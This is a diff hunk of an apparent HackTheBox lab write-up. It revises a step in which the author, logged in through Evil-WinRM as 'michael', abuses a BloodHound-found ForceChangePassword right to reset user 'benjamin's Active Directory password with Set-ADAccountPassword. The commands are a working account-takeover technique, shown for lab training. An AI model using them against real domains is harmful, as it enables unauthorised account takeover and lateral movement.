@@ -659,7 +659,7 @@ bloodhound force change password on user benjamin from user michael:
 
 connect as michael since we changed password and force change password for user benjamin:
 ```bash
-*Evil-WinRM* PS C:\Users\michael> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
-*Evil-WinRM* PS C:\Users\michael> Set-ADAccountPassword -Identity benjamin -NewPassword $newpass -Server administrator.htb -Verbose
+*Evil-WinRM* PS C:\Users\michael\Documents> $newpass = ConvertTo-SecureString "YourNewPassword123!" -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\michael\Documents> Set-ADAccountPassword -Identity benjamin -Reset -NewPassword $NewPass -Verbose
 Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=Benjamin Brown,CN=Users,DC=administrator,DC=htb".
 ```
